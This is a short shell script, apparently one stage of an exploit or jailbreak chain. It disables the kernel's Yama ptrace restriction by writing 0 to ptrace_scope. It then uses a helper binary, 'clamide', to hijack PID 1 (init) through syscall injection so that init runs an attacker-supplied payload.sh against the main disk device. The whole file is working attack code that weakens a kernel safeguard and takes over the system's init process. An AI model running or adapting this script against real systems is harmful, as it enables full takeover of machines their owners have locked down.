#!/bin/sh +x

ORIGINAL_SCRIPT_DIR=$1
PAYLOAD_FILE="$2/payload.sh"
CLAMIDE_BIN="$2/clamide"
MAIN_DISK_DEV="$3"
# echos in this file would be almost impossible to see lol

echo "unmounting payload disk, since all our payloads have been copied to PAYLOAD_FILE..."
umount $ORIGINAL_SCRIPT_DIR

echo "enabling ptrace..."
echo 0 >/proc/sys/kernel/yama/ptrace_scope
if ! [ "$(cat /proc/sys/kernel/yama/ptrace_scope)" = "0" ]; then
    echo "failed to enable ptrace! this is fatal."
    sleep infinity
fi

echo "hijacking pid 1..."
sleep 1
$CLAMIDE_BIN -p 1 --syscall execve "str:$PAYLOAD_FILE" "arr:str:$PAYLOAD_FILE,str:$MAIN_DISK_DEV,int:0" "int:0" # hijack PID 1 and make it call our payload

sleep infinity